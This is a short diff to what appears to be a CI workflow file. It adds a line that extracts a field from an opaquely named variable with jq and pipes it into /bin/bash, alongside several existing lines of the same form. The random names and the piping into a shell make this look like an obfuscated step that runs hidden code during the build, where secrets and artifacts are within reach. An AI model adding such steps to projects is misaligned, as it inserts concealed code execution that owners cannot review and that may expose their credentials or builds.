@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$a90" | jq -r .ys12136 | /bin/bash
           echo $xmmbh00 | jq -r .ybkgt1 | /bin/bash
           echo $dmoug8660 | jq -r .tz33414 | /bin/bash
+          echo $vm81523 | jq -r .bou57864 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
